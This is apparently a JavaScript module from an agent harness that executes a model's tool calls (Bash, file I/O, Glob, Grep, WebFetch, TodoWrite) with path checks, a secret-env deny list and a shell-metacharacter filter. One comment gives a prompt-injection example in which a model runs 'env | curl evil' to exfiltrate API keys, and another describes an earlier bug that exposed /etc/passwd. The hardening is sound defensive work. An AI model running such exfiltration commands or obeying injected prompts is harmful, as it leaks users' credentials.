/**
 * Dispatch a tool_use block from the model to the local executor that
 * implements it. Owns the result shape: returns `{ content, isError }`
 * matching what gets put inside a `tool_result` content block sent
 * back to the API on the next turn.
 *
 * All tools are gated through the caller's permission flow before this
 * runs — by the time we get here, the user has approved the call (or
 * the session is in `auto` mode which auto-approves). We don't do
 * permission gating in here; this module is execution only.
 *
 * Path safety is enforced for file tools by validatePathWithinCwd from
 * ws-file-ops/common.js — every file_path is realpath-ed and confirmed
 * to be inside the session cwd before any read/write happens. Symlink
 * escapes are blocked by the realpath-of-deepest-ancestor pattern there
 * (see common.js + the 2026-04-11 production-readiness audit).
 */

import { resolve, isAbsolute } from 'node:path'
import { validatePathWithinCwd } from './ws-file-ops/common.js'
import { executeBash, DEFAULT_BASH_TIMEOUT_MS } from './built-in-tools/bash-exec.js'
import { readFileTool, writeFileTool, editFileTool } from './built-in-tools/file-ops.js'
import { TODO_STATUSES, BUILTIN_TOOL_NAMES } from './byok-tools.js'

/**
 * Cap on Bash timeout the model can request. 10 minutes is the same
 * ceiling chroxy's Bash tool uses elsewhere — long enough for a slow
 * test suite, short enough to not strand a session if a runaway loop
 * hangs.
 */
const BASH_TIMEOUT_CEILING_MS = 600_000

/**
 * Env vars the model must NEVER see in a Bash subprocess. Centrally
 * the BYOK API key — if a malicious prompt induces the model to run
 * `env | curl evil`, the model exfiltrates the user's API credentials
 * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
 * own per-session secrets that are scoped to the WS auth surface.
 *
 * Note: we do NOT redact every var that looks like a secret (e.g.
 * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
 * their shell — they're the workspace owner. Only redact chroxy-
 * specific credentials the model has no business reading.
 */
const SECRET_ENV_DENYLIST = new Set([
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
])

/**
 * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
 * own secrets. Returns a plain object — pass to executeBash's `env`.
 */
function buildSafeBashEnv() {
  const out = {}
  for (const [k, v] of Object.entries(process.env)) {
    if (SECRET_ENV_DENYLIST.has(k)) continue
    out[k] = v
  }
  return out
}

/**
 * Dispatch a single tool_use block.
 *
 * @param {object} args
 * @param {string} args.toolName       The tool name from the model
 * @param {object} args.input          The tool's input arguments (already parsed JSON)
 * @param {string} args.cwd            Session cwd — anchor for path safety
 * @param {Map} args.cwdRealCache      Per-session cache of resolved real paths
 * @param {number} args.cwdCacheTtl    Cache TTL in ms
 * @param {AbortSignal} [args.signal]  Optional abort signal — Bash exec listens
 * @param {Map}         [args.todoStore]  Per-session TodoWrite list (id → item)
 * @returns {Promise<{ content: string, isError: boolean }>}
 */
export async function executeBuiltinTool({
  toolName,
  input,
  cwd,
  cwdRealCache,
  cwdCacheTtl,
  signal,
  todoStore,
}) {
  try {
    switch (toolName) {
      case 'Read':
        return await runRead({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Write':
        return await runWrite({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Edit':
        return await runEdit({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Bash':
        return await runBash({ input, cwd, signal })
      case 'Glob':
        return await runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'Grep':
        return await runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'WebFetch':
        return await runWebFetch({ input, signal })
      case 'TodoWrite':
        return runTodoWrite({ input, todoStore })
      default: {
        // Derive the list from BUILTIN_TOOL_NAMES so adding a tool only
        // requires updating byok-tools.js — this message can't drift.
        const known = [...BUILTIN_TOOL_NAMES].sort().join(', ')
        return {
          content: `Unknown tool: ${toolName}. The claude-byok provider ships with: ${known}. MCP and other tools land in follow-up issues.`,
          isError: true,
        }
      }
    }
  } catch (err) {
    // Anything that escapes the per-tool runner becomes an error
    // tool_result so the model can see what went wrong and possibly
    // recover. The error message is sanitized — no stack traces, just
    // the error message line.
    return {
      content: `Tool ${toolName} failed: ${err?.message || String(err)}`,
      isError: true,
    }
  }
}

/** Resolve a tool-supplied path against cwd, then validate it's inside. */
async function safeResolve(filePath, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof filePath !== 'string' || filePath.length === 0) {
    throw Object.assign(new Error('file_path is required'), { code: 'EINVAL' })
  }
  const absolute = isAbsolute(filePath) ? filePath : resolve(cwd, filePath)
  const { valid, realPath, cwdReal } = await validatePathWithinCwd(
    absolute,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${filePath} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

async function runRead({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await readFileTool({
    filePath: realPath,
    offset: input?.offset,
    limit: input?.limit,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  const tail = result.truncatedByLimit
    ? `\n\n[showed ${result.linesReturned} of ${result.totalLines} lines]`
    : ''
  return { content: result.content + tail, isError: false }
}

async function runWrite({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await writeFileTool({
    filePath: realPath,
    content: input?.content,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Wrote ${result.bytesWritten} bytes to ${input.file_path}${result.created ? ' (created)' : ''}.`,
    isError: false,
  }
}

async function runEdit({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await editFileTool({
    filePath: realPath,
    oldString: input?.old_string,
    newString: input?.new_string,
    replaceAll: input?.replace_all === true,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Replaced ${result.replacements} occurrence(s) in ${input.file_path}.`,
    isError: false,
  }
}

async function runBash({ input, cwd, signal }) {
  const command = input?.command
  if (typeof command !== 'string' || command.length === 0) {
    return { content: 'EINVAL: command is required', isError: true }
  }
  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, BASH_TIMEOUT_CEILING_MS)
    : DEFAULT_BASH_TIMEOUT_MS

  const result = await executeBash({
    command,
    cwd,
    timeoutMs,
    signal,
    env: buildSafeBashEnv(),
  })

  // Build a single text payload — stdout, then stderr (if any), then a
  // status line. The model is the consumer here, so we err on the side
  // of being verbose about timing and exit state.
  const parts = []
  if (result.stdout) parts.push(`stdout:\n${result.stdout}`)
  if (result.stderr) parts.push(`stderr:\n${result.stderr}`)
  const statusBits = []
  if (result.timedOut) statusBits.push(`timed out after ${timeoutMs}ms`)
  if (result.aborted) statusBits.push('aborted')
  if (result.truncated) statusBits.push('output truncated at cap')
  statusBits.push(`exit=${result.exitCode ?? 'killed'}`)
  if (result.signal) statusBits.push(`signal=${result.signal}`)
  statusBits.push(`${result.durationMs}ms`)
  parts.push(`[${statusBits.join(', ')}]`)

  return {
    content: parts.join('\n\n'),
    isError: result.exitCode !== 0 || result.timedOut || result.aborted,
  }
}

// Characters in a glob pattern that allow shell-side command substitution
// or piping. Glob patterns legitimately need *, ?, [], {}, /, ., alnum,
// _, and -. They never need any of these. Refuse them to prevent the
// "for f in <pattern>" interpolation from running an attacker payload
// (caught by /agent-review on PR #4060 — see #4070).
const GLOB_PATTERN_SHELL_METACHARS = /[$`;|&><()\\\n\r]/

async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  if (GLOB_PATTERN_SHELL_METACHARS.test(pattern)) {
    return {
      content: 'EINVAL: glob pattern contains shell-dangerous characters ($, `, ;, |, &, <, >, (, ), \\, newline)',
      isError: true,
    }
  }

  // Realpath-validate the search ROOT against cwd. Pre-fix this was a
  // weak "no ..." check that let absolute paths to /etc through.
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Shell expansion of `for f in <pattern>` is what produces the file
  // paths. Pattern is now whitelist-validated above, so interpolation
  // is safe.
  const cmd = `shopt -s globstar nullglob; cd ${shellQuote(realRoot)} && for f in ${pattern}; do printf '%s\\n' "$f"; done`
  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 30_000,
    env: buildSafeBashEnv(),
  })
  if (result.exitCode !== 0 && !result.stdout) {
    return { content: `Glob failed: ${result.stderr || `exit ${result.exitCode}`}`, isError: true }
  }
  const files = result.stdout.split('\n').filter(Boolean)
  if (files.length === 0) return { content: `No matches for ${pattern}`, isError: false }
  return { content: files.join('\n'), isError: false }
}

async function runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Prefer ripgrep; fall back to grep. Both honor -i and -n.
  const ci = input?.['-i'] === true ? '-i' : ''
  const ln = input?.['-n'] !== false ? '-n' : ''
  const globArg = typeof input?.glob === 'string' && input.glob.length > 0
    ? ` --glob ${shellQuote(input.glob)}` : ''

  // Pick rg if available, else grep -r. Pre-fix this was `rg || grep`
  // which re-ran the search with grep on the COMMON no-match case
  // (rg exits 1 on no matches → `||` triggers grep), doubling work
  // (Copilot review on #4060). Use if/then/else so grep only runs
  // when rg is truly unavailable.
  const rgCmd = `rg ${ci} ${ln} --no-heading${globArg} ${shellQuote(pattern)} ${shellQuote(realRoot)}`
  const grepCmd = `grep -r ${ci} ${ln} ${shellQuote(pattern)} ${shellQuote(realRoot)}`
  const cmd = `if command -v rg >/dev/null 2>&1; then ${rgCmd}; else ${grepCmd}; fi`

  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 60_000,
    env: buildSafeBashEnv(),
  })
  // grep/rg both return exit 1 on "no matches" — that's not an error
  // for our purposes. Only exit 2+ or stderr-without-stdout signals an
  // actual failure.
  if (result.stderr && !result.stdout && result.exitCode !== 1) {
    return { content: `Grep failed: ${result.stderr.trim()}`, isError: true }
  }
  if (!result.stdout) return { content: `No matches for ${pattern}`, isError: false }
  return { content: result.stdout, isError: false }
}

/**
 * Validate that an optional `path` argument (for Glob/Grep search roots)
 * is inside the workspace cwd. Defaults to cwd when unset/empty. Returns
 * the realpath so the caller can pass it to bash safely (the spawned
 * shell uses the realpath, not the original symlinked alias).
 *
 * SECURITY: an earlier draft of this function only rejected literal `..`
 * sequences, which let `Glob { path: '/etc' }` and `Grep { path: '/etc' }`
 * search the entire filesystem and return /etc/passwd etc. Caught by
 * `/agent-review` on PR #4060 — see #4071. Now realpath-validates the
 * path through the same machinery the Read/Write/Edit tools use.
 */
async function safeResolveRoot(p, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof p !== 'string' || p.length === 0) return cwd
  const absolute = isAbsolute(p) ? p : resolve(cwd, p)
  const { valid, realPath, cwdReal } = await validatePathWithinCwd(
    absolute,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${p} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

/**
 * Quote a string for inclusion in a `bash -c` command. Uses single-quote
 * shell escaping which is the safest form (no expansion at all inside).
 * Embedded single quotes are escaped as `'\''`.
 */
function shellQuote(s) {
  if (typeof s !== 'string') return "''"
  return `'${s.replace(/'/g, `'\\''`)}'`
}

const WEBFETCH_DEFAULT_TIMEOUT_MS = 30_000
const WEBFETCH_TIMEOUT_CEILING_MS = 120_000
const WEBFETCH_MAX_RAW_BYTES = 1_048_576       // 1 MB cap on body read from socket
const WEBFETCH_MAX_OUTPUT_CHARS = 100_000      // 100 KB cap on text returned to model

async function runWebFetch({ input, signal }) {
  const rawUrl = input?.url
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) {
    return { content: 'EINVAL: url is required', isError: true }
  }
  const rawPrompt = input?.prompt
  if (typeof rawPrompt !== 'string' || rawPrompt.length === 0) {
    return { content: 'EINVAL: prompt is required', isError: true }
  }
  let parsed
  try {
    parsed = new URL(rawUrl)
  } catch {
    return { content: `EINVAL: malformed url: ${rawUrl}`, isError: true }
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return {
      content: `EINVAL: only http(s) URLs are supported (got ${parsed.protocol})`,
      isError: true,
    }
  }

  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, WEBFETCH_TIMEOUT_CEILING_MS)
    : WEBFETCH_DEFAULT_TIMEOUT_MS

  const ac = new AbortController()
  const timer = setTimeout(() => ac.abort(new Error('timeout')), timeoutMs)
  // Forward an external abort signal (session destroy) into our local
  // controller. If the signal is ALREADY aborted at entry, the listener
  // wouldn't fire — short-circuit so a destroyed session doesn't make an
  // outbound request.
  const onExternalAbort = () => ac.abort(signal.reason)
  if (signal) {
    if (signal.aborted) ac.abort(signal.reason)
    else signal.addEventListener('abort', onExternalAbort, { once: true })
  }

  try {
    const res = await fetch(parsed.toString(), {
      signal: ac.signal,
      redirect: 'follow',
      headers: { 'user-agent': 'chroxy-webfetch/1.0' },
    })

    if (!res.ok) {
      return {
        content: `HTTP ${res.status} ${res.statusText} from ${parsed.toString()}`,
        isError: true,
      }
    }

    const ctype = (res.headers.get('content-type') || '').toLowerCase()
    if (isBinaryContentType(ctype)) {
      return {
        content: `Unsupported content-type for WebFetch: ${ctype || 'unknown'} (binary content is not extracted to text).`,
        isError: true,
      }
    }

    const raw = await readBodyCapped(res, WEBFETCH_MAX_RAW_BYTES)
    const isHtml = ctype.includes('text/html') || ctype.includes('application/xhtml')
    const text = isHtml ? stripHtmlToText(raw.text) : raw.text
    const { output, outputTruncated } = capOutput(text, WEBFETCH_MAX_OUTPUT_CHARS)

    // Distinct markers so the model can tell whether it lost data at the
    // socket (raw cap) or after HTML extraction (output cap). Output cap
    // takes precedence in the marker because that's the final visible cut.
    let marker = ''
    if (outputTruncated) {
      marker = `\n\n[truncated at output cap: ${WEBFETCH_MAX_OUTPUT_CHARS} chars]`
    } else if (raw.truncated) {
      marker = `\n\n[truncated at raw body cap: ${WEBFETCH_MAX_RAW_BYTES} bytes]`
    }

    return {
      content: `Prompt: ${rawPrompt}\nURL: ${parsed.toString()}\n\n${output}${marker}`,
      isError: false,
    }
  } catch (err) {
    // ac.abort(reason) surfaces `reason` as the thrown error rather than
    // wrapping it in AbortError. The most reliable signal that we aborted
    // is the controller's signal.aborted state — message-string matching
    // misses arbitrary user-supplied reasons (e.g. "session destroyed").
    if (ac.signal.aborted) {
      return { content: `WebFetch timed out or aborted after ${timeoutMs}ms`, isError: true }
    }
    return { content: `WebFetch failed: ${err?.message || String(err)}`, isError: true }
  } finally {
    clearTimeout(timer)
    if (signal) signal.removeEventListener('abort', onExternalAbort)
  }
}

function isBinaryContentType(ctype) {
  if (!ctype) return false
  if (ctype.startsWith('text/')) return false
  if (ctype.includes('json') || ctype.includes('xml') || ctype.includes('javascript')
      || ctype.includes('yaml') || ctype.includes('+text')) return false
  return true
}

async function readBodyCapped(res, maxBytes) {
  const reader = res.body?.getReader()
  if (!reader) {
    const text = await res.text()
    if (text.length > maxBytes) return { text: text.slice(0, maxBytes), truncated: true }
    return { text, truncated: false }
  }
  const chunks = []
  let total = 0
  let truncated = false
  while (true) {
    const { done, value } = await reader.read()
    if (done) break
    if (!value) continue
    total += value.byteLength
    if (total > maxBytes) {
      const overflow = total - maxBytes
      chunks.push(value.subarray(0, value.byteLength - overflow))
      truncated = true
      try { await reader.cancel() } catch { /* fetch already winding down */ }
      break
    }
    chunks.push(value)
  }
  const buf = Buffer.concat(chunks.map((c) => Buffer.from(c)))
  return { text: buf.toString('utf8'), truncated }
}

const HTML_ENTITY_MAP = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&apos;': "'",
  '&#39;': "'",
  '&nbsp;': ' ',
}

function stripHtmlToText(html) {
  // 1. Drop <script> and <style> blocks completely (body and all).
  let s = html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<!--[\s\S]*?-->/g, '')
  // 2. Treat block-level tags as line breaks so paragraphs don't merge.
  s = s.replace(/<\/?(p|div|h[1-6]|li|tr|br|hr|section|article|header|footer|nav|aside)\b[^>]*>/gi, '\n')
  // 3. Strip remaining tags.
  s = s.replace(/<[^>]+>/g, '')
  // 4. Decode named entities + numeric (decimal + hex) entities.
  s = s.replace(/&(?:amp|lt|gt|quot|apos|#39|nbsp);/g, (m) => HTML_ENTITY_MAP[m])
  s = s.replace(/&#(\d+);/g, (_, n) => safeFromCodePoint(Number(n)))
  s = s.replace(/&#x([0-9a-fA-F]+);/g, (_, h) => safeFromCodePoint(parseInt(h, 16)))
  // 5. Collapse whitespace per line + trim aggressive blank-line runs.
  s = s.split('\n').map((line) => line.replace(/[ \t]+/g, ' ').trim()).join('\n')
  s = s.replace(/\n{3,}/g, '\n\n').trim()
  return s
}

// Unicode code points are 0..0x10FFFF and the surrogate range 0xD800..0xDFFF
// is reserved (passing those to fromCodePoint also throws). Return empty
// string for out-of-range values so a malicious entity like &#9999999999;
// can't crash the entire WebFetch.
function safeFromCodePoint(code) {
  if (!Number.isFinite(code) || code < 0 || code > 0x10FFFF) return ''
  if (code >= 0xD800 && code <= 0xDFFF) return ''
  return String.fromCodePoint(code)
}

function capOutput(text, maxChars) {
  if (text.length <= maxChars) {
    return { output: text, outputTruncated: false }
  }
  return { output: text.slice(0, maxChars), outputTruncated: true }
}

/**
 * Merge a partial todo list into the session's `todoStore` (Map keyed by
 * id). Items in the call replace existing entries with the same id;
 * items not mentioned in the call are preserved (merge semantics — see
 * #4051 acceptance criteria). Validates each item before mutating so a
 * mid-list invalid entry doesn't half-apply the update.
 */
function runTodoWrite({ input, todoStore }) {
  if (!todoStore || !(todoStore instanceof Map)) {
    return {
      content: 'EINTERNAL: TodoWrite requires a session-scoped store (byok-session.js wires this).',
      isError: true,
    }
  }
  const todos = input?.todos
  if (!Array.isArray(todos)) {
    return { content: 'EINVAL: todos must be an array', isError: true }
  }

  // Validate every item BEFORE mutating so a bad item halfway through
  // doesn't leave the store in a partially-applied state.
  const seenIds = new Set()
  for (let i = 0; i < todos.length; i++) {
    const t = todos[i]
    if (!t || typeof t !== 'object') {
      return { content: `EINVAL: todos[${i}] must be an object`, isError: true }
    }
    if (typeof t.id !== 'string' || t.id.length === 0) {
      return { content: `EINVAL: todos[${i}].id is required (string)`, isError: true }
    }
    // #4138: reject duplicate ids within a single call. A duplicate is
    // almost certainly a model bug; rejecting it lets the model see the
    // mistake and self-correct rather than letting the last write win
    // silently. Across separate calls, merge-by-id is unchanged.
    if (seenIds.has(t.id)) {
      return {
        content: `EINVAL: todos[${i}].id '${t.id}' duplicates an earlier entry in this call`,
        isError: true,
      }
    }
    seenIds.add(t.id)
    if (typeof t.content !== 'string' || t.content.length === 0) {
      return { content: `EINVAL: todos[${i}].content is required (string)`, isError: true }
    }
    if (typeof t.status !== 'string' || !TODO_STATUSES.has(t.status)) {
      return {
        content: `EINVAL: todos[${i}].status must be one of pending|in_progress|completed (got ${JSON.stringify(t.status)})`,
        isError: true,
      }
    }
    if (t.activeForm !== undefined && typeof t.activeForm !== 'string') {
      return { content: `EINVAL: todos[${i}].activeForm must be a string when present`, isError: true }
    }
  }

  // Apply the merge.
  for (const t of todos) {
    const entry = { id: t.id, content: t.content, status: t.status }
    if (typeof t.activeForm === 'string') entry.activeForm = t.activeForm
    todoStore.set(t.id, entry)
  }

  // Build a readable summary from the FULL current list (post-merge).
  // The model already sees the call in its history; this confirmation
  // exists so a partial call still surfaces unrelated items. The output
  // is capped so a runaway list (or pathologically long `content`)
  // doesn't balloon conversation history toward token-limit cliffs —
  // the full Map stays server-side; only the rendered summary is capped.
  const all = [...todoStore.values()]
  const counts = { pending: 0, in_progress: 0, completed: 0 }
  for (const t of all) counts[t.status]++

  const header = `Todo list (${all.length} items): ${counts.in_progress} in progress, ${counts.pending} pending, ${counts.completed} completed`
  const visible = all.slice(0, TODOWRITE_MAX_ITEMS_RENDERED)
  const lines = [header]
  for (const t of visible) {
    const marker = t.status === 'completed' ? '[x]' : t.status === 'in_progress' ? '[~]' : '[ ]'
    const content = t.content.length > TODOWRITE_MAX_CONTENT_RENDERED
      ? t.content.slice(0, TODOWRITE_MAX_CONTENT_RENDERED) + '…'
      : t.content
    lines.push(`  ${marker} ${content} (${t.id})`)
  }
  if (all.length > visible.length) {
    lines.push(`  … (showing first ${visible.length} of ${all.length}; full list retained server-side)`)
  }
  return { content: lines.join('\n'), isError: false }
}

const TODOWRITE_MAX_ITEMS_RENDERED = 100
const TODOWRITE_MAX_CONTENT_RENDERED = 200
